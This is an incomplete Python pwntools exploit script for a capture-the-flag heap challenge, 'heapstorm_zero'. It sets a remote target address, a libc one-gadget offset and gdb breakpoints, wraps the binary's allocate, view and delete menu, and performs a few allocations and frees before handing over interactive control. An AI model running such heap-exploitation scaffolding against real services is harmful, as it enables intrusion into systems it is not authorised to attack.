#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools
import time
import os

# IP = "52.68.236.186"
# PORT = 56746
IP = "150.109.46.159"
PORT = 20001

one_gg = 0x4f322

context.arch = "amd64"
context.log_level = 'DEBUG'
# context.log_level = 'critical'
context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
BIN = "./heapstorm_zero"

def lg(s, addr):
    print('\033[1;31;40m%30s-->0x%x\033[0m' % (s, addr))

def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()


io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    io = remote(IP, PORT)  
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif args.local or args.debugger:
    # env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
    env = {}
    io = process(BIN,  env=env)
    proc_base = io.libs()[os.path.abspath(os.path.join(os.getcwd(), BIN))]
    # libc_bb = io.libs()[os.path.abspath(
    #     os.path.join(os.getcwd(), "libc.so.6"))]
    libc_bb = io.libs()[
        '/lib/x86_64-linux-gnu/libc.so.6']
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    parser.print_help()
    exit()

def alloc(size, payload):
    rud("Choice:")
    sel("1")
    rud("Please input chunk size:")
    sel(str(size))
    rud("Please input chunk content:")
    sel(payload)
    rud("Chunk index:")
    data = rud("\n").strip()
    return int(data)

def view(id):
    rud("Choice:")
    sel("2")
    rud("Please input chunk index:")
    sel(str(id))

def delete(id):
    rud("Choice:")
    sel("3")
    rud("Please input chunk index:")
    sel(str(id))


for i in range(2):
    id = alloc(0x18, "A"*0x10)
    lg("id_" + str(i), id)

# for i in range(31):
#     delete(i)

delete(0)

if args.debugger:
    gdb.attach(io, '''
    b *0x{:x}
    b *0x{:x}
    b *0x{:x}
    b *0x{:x}
    c
    p/x &__free_hook
    p/x &_IO_2_1_stdout_
    p/x 0x{:x} + 0x4f322
    '''.format(
        proc_base + 0x0000000000001094,  # calloc
        proc_base + 0x000000000000126D,  # free
        proc_base + 0x00000000000011D6,  # show heap
        libc_bb + one_gg, # one gadget
        libc_bb
        )
    )

id3 = alloc(0x18, "B"*0x18)
lg("id3", id3)

# delete(1)

# id3 = alloc(0x18, "B")
# lg("id3", id3)

# view(id3)

io.interactive()
